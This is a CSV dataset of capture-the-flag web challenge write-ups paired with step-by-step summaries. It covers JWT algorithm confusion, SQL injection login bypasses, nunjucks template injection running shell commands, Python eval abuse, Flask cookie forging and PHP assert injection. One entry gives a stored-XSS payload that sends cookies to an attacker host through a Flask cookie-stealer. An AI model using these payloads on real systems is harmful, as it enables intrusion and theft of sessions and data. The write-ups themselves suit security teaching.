"text","summary"
"1. Looking at the source code we see that in the `challenge/helpers/JWTHelper.js` file, both the ""RS256"" and ""HS256"" algorithms are allowed for decryption. This is CVE-2016-5431/CVE-2016-10555.

2. The HS256 algorithm is symmetric, which means it uses the sane secret key to sign and verify each message. The RS256 algorithm is asymmetric, which means it uses a private key to sign the message and a public key for verification. However, if we change the algorithm from RS256 to HS256, the backend code will use the public key as the symmetric secret key. In other words, the HS256 algorithm will be used to verify the signature with the public key as the HS256 secret key. We know the public key so we can, in theory, easily modify the JWT and sign it.

3. However, before we can do this we need to get the JWT token and get the public key. So, make an account on the website, open up your browser's cookie page in the developer tools, and copy the `session` cookie. We can use [JWT.io](https://jwt.io/) or [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) to decode the cookie.
[Python command: Use jwt_tool.py to decode the JWT token]

4. Fortunately for us, the public key is encoded in the JWT. So, to get access to the `/api/elf/edit` and `/api/elf/list` endpoints, we need to tamper with this token to change the `username` to ""admin"" using the RS256-to-HS256 exploit.

5. There are an abundance of ways that you can perform the RS256-to-HS256 exploit: [3v4Si0N/RS256-2-HS256](https://github.com/3v4Si0N/RS256-2-HS256), [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool), manually via [JWT.io](https://jwt.io/), by running the commands in [this excellent guide](https://habr.com/en/post/450054/). However, you have to be very careful about newlines in the public key. I tried all of these methods with about every option possible. One way that worked is by running a command using `jwt_tool.py`, providing the JWT and public key as input, applying the key confusion exploit and specifying the username to be changed to ""admin"".
Alternatively, see [Alternative JWT Decoding Steps](#alternative-jwt-decoding-steps) for an approach using [JWT.io](https://jwt.io/).

The output of this command has the tampered token.

6. Anyway, once you have the tampered token, swap it out with the non-admin token in your browser's developer tools. Now, we can access the admin dashboard and the `/api/elf/edit` and `/api/elf/list` endpoints.

7. Back in the source code, if we look at the `challenge/routes/index.js` file we see that the `/` endpoint uses the `CardHelper` class to generate the card with a list of the elf's names. Since we are now an admin, we can edit the names of these elfs, and thus we control this value. Looking at `challenge/helpers/CardHelper.js`, we notice that the `nunjucks` templating engine is used and that we can contol what is passed to a `nunjucks` template. Thus, this is a `nunjucks` SSTI (Server-Side Template Injection).

8. Searching for ""nunjucks ssti"" reveals [this great guide](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) about breaking out of the `nunjucks` templating engine. We can run `{{range.constructor(""return global.process.mainModule.require('child_process').execSync('cat /flag*')"")()}}` to print the contents of the `/flag` file. We determined that this is where the flag is by looking at the `Dockerfile` in the challenge ZIP. The `flag` file is copied to `/flag` within the container.

9. So, in the admin dashboard, we copy and paste out payload `{{range.constructor(""return global.process.mainModule.require('child_process').execSync('cat /flag*')"")()}}` into one off the elf's name field, submit the changes, and then we navigate back to the home page, `/`, and there's the flag. You can view the source of this page to make copy and pasting the flag easier.

### Alternative JWT Decoding Steps

1. Get a JWT token from the application by signing into any account and paste it into [JWT.io](https://jwt.io/).

2. Copy the public key and make sure that there is no new line at the end. I got this public key from [JWT.io](https://jwt.io/):
[Public key obtained from JWT.io]

3. Base64 encode the public key with `echo -en ""public key"" | base64`. We use the `-e` and `-n` flags with `echo` to tell it to intepret escape sequences and to not output a newline at the end.
[Bash command: Base64 encode the public key]

4. Paste the JWT into [JWT.io](https://jwt.io/) again. Then, change change the algorithm to ""HS256"" and change the `username` field to ""admin"". Next, paste the base64 encoded key into the ""your-256-bit-secret"" field. Check the ""secret base64 encoded"" box, and now you should have your tampered JWT.
","Examine the source code, finding that both ""RS256"" and ""HS256"" algorithms are allowed for decryption.
Understand the differences between the HS256 and RS256 algorithms.
Create an account on the website, and obtain the JWT token and public key.
Tamper with the token to change the `username` to ""admin"" using the RS256-to-HS256 exploit.
Swap the tampered token with the non-admin token in your browser's developer tools to access the admin dashboard.
Examine the source code again to identify a potential `nunjucks` SSTI vulnerability.
Utilize a payload that breaks out of the `nunjucks` templating engine to read the flag file.
Insert the payload into one of the elf's name fields in the admin dashboard, and navigate to the homepage to reveal the flag.
"
"1. The website is a simple login page.

2. After looking at the source code for a while, I noticed that the `database.sql` file contains the password hashes for a manager and admin user. [CrackStation](https://crackstation.net/) is a great way to see if these are known hashes, so I pasted them both in and got the credentials `manager:bigsanta!` and `admin:tryharder`.

3. `manager:bigsanta!` is a valid login by `admin:tryharder` is not. After signing in we can see a list of toys and some other properties.

4. Looking back at the source code in the `database.sql` file we see that the flag is contained in the database with the rest of the toys, but it has the approved value set to 0 instead of 1.

5. In `challenge/routes/index.js` we see that the `/api/toylist` endpoint will set `approved` to 1 unless the currently signed in user has the username `admin`. So, we have to sign in as admin.

6. My first thought was that this was a JWT challenge since JWTs are used and we are given a user with valid credentials. However, after poking around, the `database.js` source code shows that users are authenticated like so: `let stmt = ""SELECT username FROM users WHERE username = '${user}' and password = '${pass}'\"";`. This looks like it could be vulnerable to a SQL injection.

7. On the main login page, I tried some common SQL injection payloads from [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass). The one that ended up working was username `admin' -- ` and the password can be anything. This will show us the final ""unapproved toy"" which is the flag.
","Examine the website and find the `database.sql` file containing password hashes.
Use CrackStation to crack the hashes, obtaining credentials for the manager and admin users.
Log in with the manager credentials, viewing a list of toys and properties.
Identify the flag in the database with an ""approved"" value set to 0.
Find the `/api/toylist` endpoint in the `challenge/routes/index.js` file, and note that the ""approved"" value must be 1 for the admin user.
Notice the potential SQL injection vulnerability in the `database.js` file.
Attempt various SQL injection payloads on the main login page, ultimately using the payload `admin' --` to bypass authentication and reveal the flag.
"
"1. Let's start by looking at the `challenge/index.js` file in the source code zip. The application connects to a sqlite database (`const db = new Database('toy_workshop.db');`), so lets look at `database.js`.

2. `database.js` allows for adding and reading items from the database. While we do control the `query` variable via the website, it does not look like we would be able to accomplish anything using an SQL injection.

3. Let's look at the `challenge/routes/index.js` file. There is an `/api/submit` endpoint which the frontend posts user data to. This function adds our user input, called a query, to the database and then calls `bot.readQueries(db)`. The `/queries` endpoint simply returns all the queries contained in the database. We cannot access the `/queries` endpoint because the IP address must be `127.0.0.1`, which is the localhost loopback address, otherwise the page redirects to `/`.

4. Next, let's check out `challenge/bot.js` so we can figure out what `bot.readQueries(db)` does. `bot.js` imports puppeteer, a headless Chromium browser controlled via JavaScript, defines a `flag` variable that holds the flag, loads the index page of the application, sets the `flag` cookie in the browser, visits the `/queries` endpoint, and then exits.

5. This is a stored cross-site scripting vulnerability (Stored XSS). We can send a malicious script through the frontend to the database. When a user visits the `/queries` page, the server will serve the malicious code to the user. We can craft our malicious code to grab the current cookies and then redirect to a webpage we control with those cookies as parameters in the request.

6. The malicious code is standard XSS code: `<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>`. We redirect to our webpage by changing the `document.location` and we set the `c` argument to `document.cookie`, which contains the current page's cookies.

7. However, we need to actually run a server to receive this request and log the cookie. There is a basic [Flask](https://flask.palletsprojects.com), a micro web framework written in Python, application that does exactly this in [xss-cookie-stealer.py](xss-cookie-stealer.py). The script defines one route, `/`, that will read the `c` parameter in the request URL, open a file called `cookies.txt`, write the contents of the `c` parameter to that file, and then redirect to `https://google.com`. We run this server on all interfaces (`0.0.0.0`) on port `16361`.

8. You can run this script anywhere that is internet accessible. For instance you can port forward port `16361` through your router or you could deploy a machine on Google Cloud. But, the easiest method is to use [ngrok](https://ngrok.com/).

9. Create an account at <https://ngrok.com/>, download the application, and get logged in. Now, start the Flask python server with `python xss-cookie-stealer.py` and then run `/ngrok http 16361`. Ngrok will display a URL in the form `http://<subdomain>.ngrok.io`.

10. Paste your ngrok URL into the malicious payload. If ngrok said my URL was `http://92832de0.ngrok.io`, then the payload should be `<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>`

11. Finally, paste the payload into the frontend for the application, wait a few second for the puppeteer instance to start and load the page, and then you should see the flag in your terminal running Flask and in the `cookies.txt` file.
","Examine the `challenge/index.js` and `database.js` files to understand how the application connects to the SQLite database.
Analyze the `challenge/routes/index.js` file, focusing on the `/api/submit` and `/queries` endpoints.
Investigate the `challenge/bot.js` file to understand the use of Puppeteer and the `flag` variable.
Identify a stored cross-site scripting vulnerability (Stored XSS) and plan to exploit it by sending a malicious script.
Create the malicious XSS payload to redirect the target to an attacker-controlled server with the current cookies as URL parameters.
Set up a Flask server with the script `xss-cookie-stealer.py` to receive the request and log the stolen cookie.
Use a service like ngrok to create an internet-accessible server.
Insert the ngrok URL into the malicious payload.
Paste the payload into the frontend of the application, wait for the Puppeteer instance to load the page, and obtain the flag from the Flask server terminal or the `cookies.txt` file.
"
"Hint: ""80s action movies really inject you full of adrenaline!""

This challenge gives provides you a website with the ability to upload a barcode. The website will ""scan"" this barcode and will return information about the movie title that was encoded.

1. To solve this challenge, generate a barcode with a SQL injection that returns all rows using an online barcode generator.
    * For example, `' OR 1=1;  --  `
2. Upload the barcode to the website.
3. The flag can be found at the bottom of the returned results.
","Generate a barcode with a SQL injection that returns all rows using an online barcode generator, such as `' OR 1=1; --`.
Upload the barcode to the website.
Find the flag at the bottom of the returned results.
"
"Hint: ""There is a vulnerability in the way that the server takes user input and processes it.""

We see that this website is running on Flask, and that the logic for dealing with the input form is as follows: 
[Flask code: Process input using the eval() function and calculate jacket size]

This exploit relies on the dangerous use of Python's `eval()` function. When passed a string, `eval` will attempt to evaluate the string as a Python expression. Though the intended use-case here is to do basic math with strings (e.g., sending ""1+1"" will return `2`), we can also use it to send lines of code that we want Python to run. By using the `subprocess` library, we can execute shell commands from within Python. Especially useful is the `getoutput()` function, which will return the output of the command as a string. With this knowledge, and knowing that the flag is at `/flag/flag.txt`, we can craft the following payload:
[Payload: Use Python subprocess library to execute a shell command and read the flag from /flag/flag.txt]
","Analyze the Flask code and notice the dangerous use of Python's eval() function.
Understand that the `eval()` function can be exploited to execute shell commands using the `subprocess` library.
Craft a payload using the `subprocess` library to execute a shell command and read the flag from `/flag/flag.txt`.
"
"Hint: ""Github can be used for more than just storing code. The 'Actions' tab at the top of the repo might provide some insight.""

This challenge's exploit takes advantage of a misconfigured GitHub Actions build script.

1. The description mentions that this is a 'fully-automated release.' Instead of a link to a C binary, the challenge links us to a GitHub repo from a user named [Magpie Inc](https://github.com/magpie-inc/flag-checker)

2. The `magpie-inc` user seems to have a single public repo. The source code for the binary, `flagchecker.c`, is out here in the open. Looking closer at the source code, it appears that our Flag-Checker 9000 takes user input, hashes the input using MD5, and compares the result to a macro called `FLAG_HASH`.

3. As the hint mentions, there seems to be a lot of code here that isn't related to `flagchecker.c`. Perhaps the exploit isn't in the source code of Flag-Checker 9000 itself?

4. In the folder `.github/workflows`, we find a file called `build_flag_checker.yml`. It appears that this GitHub Action is the automated script responsible for packaging Flag-Checker 9000.

5. Reading the script `./build.sh` referenced in step 'Build Flag Checker Program' we can see that it uses the 1st command-line argument as the value assigned to the macro. `build_flag_checker.yml` is using the output of a previous step as the arg to the 'Build Flag Checker Program' step: ""${{ steps.get_hash.outputs.HASH_VALUE }}""

6. The output of the 'Get hash' step is the result of a second bash script, `flaghash.sh`. This one appears to cURL an IP address, and then hashes the results using MD5. We know that `flagchecker.c` is converting the user's guess to an MD5 hash and tells us that our flag is right if our hash matches the value of `FLAG_HASH`. However, the value of the cookie 'auth' in the curl request is set to `${ secrets.FLAG_AUTH }` which doesn't seem to be accessible in any of the files. In the workflow runs (accessible under the 'actions' tab on the repo), the value of FLAG_AUTH is starred out.

7. The last thing to investigate is the commit history. We can see that there is a commit with the message 'Fix auth!!!' 

8. If we look at the changes made for the commit, we see that an earlier version was set up slightly differently, with the 'auth' cookie set in the code of `gethash.sh` itself.

9. Run a cURL command with the discovered auth cookie to access the IP address, and the result is the flag!
","The challenge involves a misconfigured GitHub Actions build script in the 'magpie-inc/flag-checker' repo.
Examine 'flagchecker.c' source code, where `Flag-Checker 9000` takes user input, hashes it using MD5, and compares it to a macro called 'FLAG_HASH'.
Investigate the '.github/workflows/build_flag_checker.yml' file, which is responsible for packaging `Flag-Checker 9000`.
Analyze the 'build.sh' and 'flaghash.sh' scripts, revealing that 'FLAG_AUTH' is used as a cookie for a cURL request but isn't accessible in any file.
Check the commit history, finding a commit titled 'Fix auth!!!'.
Review the changes in the commit, discovering that the 'auth' cookie was previously set in 'gethash.sh'.
Run a cURL command with the discovered auth cookie to access the IP address and obtain the flag.
"
"The website appears to be a renderer for LaTeX code. Writing LaTex and clicking ""Generate PDF"" gives a link to a rendered PDf. The output LOG of the LaTeX renderer will also be displayed. 

1. Looking at the source HTML indicates that we need to read the flag from a file found in `/sweatin/to/the/oldies/flag.txt`.

2. LaTeX is turing-complete and has the ability to read files, however, certain strings have been blacklisted. Most notably, `/` has been blacklisted making it challenging to create the path to read the file.

3. The `/` character however can be isolated from `index.html` using the `\StrMid` function from the `xstring` package. By getting the `/` character from `index.html`, we can use it to build our path and bypass the blacklisted characters filter.

4. Using this we can write the following LaTeX code that will build the path and read the flag:
[LaTeX code: Uses xstring package to bypass blacklisted characters, build the path to the flag, and read it]

The flag can be found in the returned LOG data.

*Inspired and derived from [the web90 challenge in Internetwache CTF 2016](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)*
","Analyze the website, which is a LaTeX renderer that outputs a PDF and log data.
Examine the source HTML to find the path to the flag: `/sweatin/to/the/oldies/flag.txt`.
Bypass the blacklisted characters filter by using the `\StrMid` function from the `xstring` package to isolate the `/` character from `index.html`.
Write LaTeX code that uses the `xstring` package to bypass blacklisted characters, build the path to the flag, and read it.
Obtain the flag from the returned log data.
"
"This challenge gives you a file named `cipher` and the source code used to return the flag. Your goal is to reverse engineer the source code to create, and upload, the key that will allow the flag to be returned. This challenge requires you to exploit PHP loose comparison. In PHP versions less than 8 using `==` will loosly compare variables of different types, allowing expressions to implicitly evaluate to true. Any string (i.e. `password.txt`) compared with the integer `0` will evaluate to `true`. By making `to_check` equal to `0` we can echo the flag.

A table showing all of the PHP loose comparison values can be found [here](https://www.php.net/manual/en/types.comparisons.php).

1. In order to get the flag we need to ensure that `$to_check` is `0` to exploit PHP using loose comparison.

2. Create a 8 byte file that is equivalent to the the data in `cipher + 0xd34db33f` and upload it.
Your key will be XORed with `cipher + 0xd34db33f`. If they are equivalent then the XOR result will be zero.

3. The if statement will be `0 == ""whatever the password is""` which evaluates to true, and the flag will be echoed back.
","Understand that the challenge requires exploiting PHP loose comparison, specifically using `==` to compare variables of different types.
Ensure `$to_check` is `0` to exploit PHP loose comparison.
Create an 8-byte file equivalent to the data in `cipher + 0xd34db33f` and upload it.
The key will be XORed with `cipher + 0xd34db33f`, and if they are equivalent, the XOR result will be zero.
The if statement `0 == ""whatever the password is""` will evaluate to true, and the flag will be echoed back.
"
"Hint: ""Luckily, the intern was vaccinated. He got his INJECTION recently.""

1. Download app.py and examine the render function

2. Determine that template injection is possible when passing things in the textbox

3. Input `{{ state.flag }}` (you could also do `{{ state }}` and get the flag)
","Download and examine 'app.py', specifically the render function.
Identify that template injection is possible when passing values in the textbox.
Input `{{ state.flag }}` or `{{ state }}` in the textbox to retrieve the flag.
"
"Description: ""We received a message from the founder of Flag West. They said that there was one flag that they were able to hide before Mom & Pops got them all. The message said that it is hidden somewhere in the website, and that you just need to inspect it a little. Flag West was one of the first aquisitions that Mom & Pops made, so it is surprising to hear that there still might be a flag left. Get in there and find that flag, make Flag West's last act of defiance worth something.""

Hint: ""Use Dirb""

1. The flag is broken up into three parts that can be found by inspecting the code.

2. The first part is found as a comment within the HTML.

3. The second part of the flag is found as a comment in the style.css file

4. By using Dirb the thrird part of the flag can be found in the path academic/developers/secrets/final.txt

5. Combine all of the parts for the full flag submission
","Understand that the flag is divided into three parts, which can be found by inspecting the website code.
Locate the first part as a comment within the HTML.
Find the second part as a comment in the 'style.css' file.
Use Dirb to discover the third part in the path 'academic/developers/secrets/final.txt'.
Combine all parts to obtain the full flag for submission.
"
"Description: ""Your team has uncovered an old admin login page that Mom & Pops Flag Shop used to run back in the day. They overhauled their website after buying up all those other shops, but rumour has it that an old family flag was left behind. Forge a path, find the flag, and enjoy your baked goods.""

Hint: ""Ever had to forge a signature? Flask gives you good practice.""

1. When you first enter the site, you'll be met with a login page. Try and login using username: admin and password: admin. (Could change these for anything, doesn't really matter).

2. You'll then see a page saying that the login was incorrect, and to visit one of Mom & Pops' recently acquired companies. In here are a few random names, but one points to 'Robots.txt'.

3. Go to the robots.txt page for the site and you'll find that it tells you that your browser is unsupported and point you towards Internet Explorer 6.01.
The User-Agent for IE 6.01 is ""Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)"" (from http://www.useragentstring.com/index.php?id=7730)

4. Next you can change your browser's user-agent by (in chromium):
- Go to 'Inspect'
- Click on the 3 dots in the right-hand corner
- 'More Tools'
- 'Network Conditions'
- Uncheck 'Use browser default'
- Enter the User-Agent for IE 6.01

5. Now, reload the page with the new user-agent and you'll find:
[Message from robots.txt with secret key: flour_sugar_chocolate_and_lotsalove]

6. There are some interesting words in here that might catch your eye and that relate to websites: cookies, flasks, and secret keys. If you're familiar with flask and how its session cookies work, you'll know that it signs them rather than encrypting, and to do this a ""secret key"" is used. If not, googling the key terms should get you a page like this one: https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce

7. Now you have a the secret key by which the cookies of this site are made: flour_sugar_chocolate_and_lotsalove. To obtain your current cookie, you could use 'Inspect' -> Storage -> Cookies and get the value. This is a Base64 encoding of the session data, a time stamp, and a cryptographic hash.

8. You can decode the cookie to obtain the session data with a tool like cyberchef: https://gchq.github.io/CyberChef/.
[Decoded example: {""admin"":false,""username"":""admin""}]

9. Since this is the admin account you're trying to access, you probably want to set the 'admin' field to 'true'. Unfortunately, you can't just change it to 'true' and send it off in a POST request because Flask still has the SHA1 hash which is based on the session data, the timestamp, and the secret key. Fortunately, Mom's leaked email gave you the secret key!

10. To craft the session cookie, that previous site (https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce) gives a good script, into which you just need to add the secret key and some session data for setting admin to true.
[Python script: Craft the session cookie with secret key and session data]

11. Running this script will give the new session cookie, which you can send to the site by intercepting an HTTP request/using a cookie editor tool.

12. Press 'login' on the login page once that new cookie's been put in and VOILA! The Flag!
","Attempt to log in with any username and password on the site's login page.
Visit the 'Robots.txt' page mentioned after the incorrect login attempt.
Change your browser's user-agent to Internet Explorer 6.01's user-agent.
Reload the page with the new user-agent and find the secret key.
Understand that Flask signs session cookies using a secret key.
Decode the current session cookie to obtain the session data.
Set the 'admin' field to 'true' in the decoded session data.
Craft a new session cookie using the secret key and modified session data.
Replace the existing session cookie with the newly crafted cookie.
Press 'login' on the login page with the new cookie, and obtain the flag.
"
"Description: ""Hello W-Team, Recon has found an old website from OmniFlags. We think there may be an insecure admin portal somewhere. See if there is anything you can find! They never did hire the best developers.""

Hints:
1. ""Beep Boop, now where did we put that page again?""
2. ""Cookies are stored locally, like in a cookie jar or something...""

1. The admin.html page needs to be found. There is an invisible link in the nav-bar. Robots.txt mentions `/admin.html`, or it can be seen when inspecting the code.

2. Once the admin login page is found, then you need to attempt to login. At this point a cookie is generated.

3. By checking the cookie, we can see that we have an admin cookie set to false. If the value is changed to 'true' the page will redirect to the flag.
","Locate the 'admin.html' page through an invisible link in the nav-bar, the 'Robots.txt' file, or by inspecting the code.
Attempt to log in on the admin page, which generates a cookie.
Check the cookie and find that the admin value is set to 'false'; change the value to 'true' to get redirected to the flag.
"
"Description: ""**URGENT**  W-Team, An OmniFlags educational website has been hacked by one of the captives in the space prison, who we believe has left a message for us. Can you find it?""

Hint: ""Someone had to add code to cause the flash on the screen. I wish we could stop this code from executing.""

When the website is first loaded, it can be seen that there is a flag that quickly changes to the omni flags logo after less than a second. Reloading this page will show the flash of the flag again but it is not fully readable. In order to keep the flag on the screen to make it readable, you need to:

1. Inspect the page

2. Navigate to the sources tab and open the javascript file

3. Create a breakpoint in this javascript file

4. Reload the page and the flag will stay on the screen.
","Inspect the page.
Navigate to the sources tab and open the JavaScript file.
Create a breakpoint in the JavaScript file.
Reload the page, and the flag will stay on the screen.
"
"So the challenge was an easy one. `Cheap` can be bought by entering a valid credit card but purchase failed for `flag`. After looking at the challenge for a very long time, `data` parameter in the URL looked suspicious.
[`data` during buying of `flag`]
[`data` contents during buying of `cheap`]
[`data` contents after failed purchase]
[`data` contents after successful purchase]

So, three successful purhases of `cheap` gave same prefix and prefix changed in unsuccessful purchase.
Also suffix of `c1` and `cp1` are same, so most probably they contain information about `product name` and suffix contain `purchase status` 

Initially I tried to decode the data contents but got no luck.
So I just tried to brute-force the prefix using the script.
[Python script: Brute-force the prefix by trying various combinations of the data from failed and successful purchases]

And obtained the flag URL.
","Observe that the `data` parameter in the URL looks suspicious during the purchase process.
Analyze the `data` contents during successful purchases of `cheap` and failed purchases of `flag`.
Notice that the successful purchases share the same prefix and the suffixes of `c1` and `cp1` are the same, likely containing product name and purchase status information.
Attempt to decode the `data` contents without success.
Create a Python script to brute-force the prefix by trying various combinations of the data from failed and successful purchases.
Obtain the flag URL using the brute-forced prefix.
"
"A quick look at the website's `.git` folder shows that we can access files such as `.git/HEAD` etc, but the directory wasn't directly browsable or clonable, so by using [dumper from GitTools](https://github.com/internetwache/GitTools). Looking through the repo and the files, the `flag.php` file doesn't have the flag, and no history information that has the file. Hence, I thought I should look at the source, and figure out a flaw that can be used on the server.

I was kinda stuck for a while, until @captn3m0 (Nemo) told me that the asserts (in [index.php](git-folder/index.php)) were in strings. Obviously, there was some sort of eval being done on the string.

So, using the page string as `' and die(show_source('templates/flag.php')) or '`, the assert would cause the source of the `flag.php` file to be revealed, which it did :)

BTW, the URL to run that page was `http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27`

Fun challenge overall :) Goes on to show that one should NEVER let user input be `eval`d in any way. [This stackoverflow answer](https://stackoverflow.com/questions/3115559/exploitable-php-functions) has a nice list of all the executable pathways in PHP.
","Discover that the website's `.git` folder is accessible, but not directly browsable or clonable.
Use the dumper from GitTools to access the repository and examine files such as `flag.php`.
Realize that the asserts in `index.php` are in strings, indicating the potential for an eval vulnerability.
Craft a page string `' and die(show_source('templates/flag.php')) or '` to exploit the vulnerability and reveal the source of `flag.php`.
Visit the URL `http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27` to run the crafted page string and obtain the flag.
Learn the lesson of never allowing user input to be `eval`d and refer to a list of exploitable PHP functions for future reference.
"
"One of the different admin pages (namely, `report`), was vulnerable to an SQL injection from the `id` parameter. This allowed us to leak one value of one column of information directly to the output.

Additionally, it was easy to notice that it was using MySQL. Hence, we could use the different ""special tables"" in MySQL with a `UNION SELECT` based query and obtain information.

The most irritating part of this process was finding the number of columns in the union select attack, since (for some reason), my extensions on Firefox were messing up, and I was constantly forced to manually keep running URLencode and URLdecode :(

Nevertheless, using `group_concat()`, it is possible to obtain all entries in a column, as a single row, and we used that to obtain information in a very fast way.

Without further ado, here are the different queries that were run (URLdecoded versions, for easier reading):
[A query to determine the number of columns in the UNION SELECT attack]
[A query to obtain table names from the information_schema.tables]
[A query to obtain column names from the information_schema.columns]
[A query to retrieve the flag from the flag column in the flag table]

The `flag` column in the `flag` table had the flag.
","Identify the `report` admin page as vulnerable to SQL injection from the id parameter, allowing leakage of one column of information directly to the output.
Recognize that the system is using MySQL and consider using ""special tables"" in MySQL with a `UNION SELECT` based query to obtain information.
Overcome the challenge of finding the number of columns in the UNION SELECT attack due to browser extension issues.
Utilize `group_concat()` to obtain all entries in a column as a single row, allowing for efficient information retrieval.
Execute the following queries (URLdecoded versions for easier reading):
determine the number of columns in the UNION SELECT attack;
obtain table names from the information_schema.tables;
obtain column names from the information_schema.columns;
retrieve the flag from the flag column in the flag table.
Find the flag in the `flag` column of the `flag` table.
"
"`/login.php` is vulnearable to sql injection.
However, filters were applied on the double quotes. By using a specific username and password combination, they were able to bypass the filter and log in as admin.

After logging in, the teammate pointed out that the site was also vulnerable to Local File Inclusion (LFI). They used an LFI technique to access a PHP script:
[PHP script: the site is under maintenance and all destructive actions are disabled]

Next, they used another LFI technique to access a PHP script containing the flag, but the password was missing. The PHP script had a username, a salt value, and an empty password field.
[PHP script: Generate the flag using the username, password, and salt]

Now using a Python script, we were able to brute-force the password.
[Python script: Brute-force the password]

So, this was the challenge which had all fruits in the basket, we had sqli, LFI, path transversal, blind sqli.
","Identify /login.php as vulnerable to SQL injection with filters applied on double quotes. Bypass the filter and log in as admin using a specific username and password combination.
Discover Local File Inclusion (LFI) vulnerability on the site after logging in.
Use an LFI technique to access a PHP script, revealing that the site is under maintenance and all destructive actions are disabled.
Use another LFI technique to access a PHP script containing the flag, a username, a salt value, and an empty password field.
Employ a Python script to brute-force the password.
Complete the challenge, which involved SQLi, LFI, path transversal, and blind SQLi vulnerabilities.
"
"On opening the link the site says *to login move to /login by post and send json request* and as the description say to use cURL so lets start with it.
[Send an HTTP POST request using cURL with JSON data containing a username and password]

In return, we get a jwt token. Used [jwt.io](https://jwt.io/) to decode that token which had payload like this `{""user"":""guest""}`. So what now?

Always check `robots.txt` of all web challs in any CTF because sometime it may have some data which can be useful.
Just like in this chall accessing `/robots.txt` we get `/flag` page.

We can't make a GET request to `/flag`, so maybe POST?
On making a POST request to `/flag` we get something like this ""gimme token and I will give you the flag"".

On passing the jwt token which we got earlier we get a response like this `Not the admin, no flag for you`. So it needs admin token, well we can edit the token to `{""user"":""admin""}` using [jwt.io](https://jwt.io/) and passing that token to `/flag` we get the flag.

What was the Bug? In this chall I was just checking the decoded value to have value of `user` to be `admin` (`{""user"":""admin""}`) to show to the flag thats it, the code was not checking for any signature verification.
","On opening the link, send an HTTP POST request using cURL with JSON data containing a username and password.
Receive a JWT token and use jwt.io to decode it, revealing a payload like `{""user"":""guest""}`.
Check `robots.txt` and find the `/flag` page.
Make a POST request to `/flag` and receive a message requesting a token.
Pass the JWT token received earlier and get a response indicating it requires an admin token.
Edit the token to `{""user"":""admin""}` using jwt.io and pass it to `/flag` to obtain the flag.
Understand that the bug was in the code, which only checked for the decoded value of the user to be `admin` without verifying the signature.
"
"On opening the link we see a login form, log in with any junk user and pass we get redirected to `/flag` which says `Not admin, no flag for you` hmmm...

On checking cookies we see there is key `token` with some value which is JWT again xD, checking it on [jwt.io] get this

The token is using RS256 algorithm which means it needs a private key and a public key 

On accessing `/robots.txt` and a little bit of scrolling xD we see there is some PRIVATE KEY.

So we have the private key now then we can build a token and apply the signature to it. I used nodejs `jsonwebtoken` library to do this stuff:
[Node.js script: Sign JWT token with private key]

Now access the `/flag` using the token as cookie and we get the flag

The bug in this challenge was that the private key was not properly hidden.
","Access the login form and log in with any junk username and password, then get redirected to `/flag`.
Check cookies and find the `token` with a JWT value.
Analyze the token and discover it uses the RS256 algorithm, which requires a private key and a public key.
Find the private key in `/robots.txt`.
Use the Node.js `jsonwebtoken` library to create a new JWT token signed with the private key.
Access the `/flag` route using the newly created token as a cookie to obtain the flag.
Recognize the challenge's bug: the private key was not properly hidden.
"
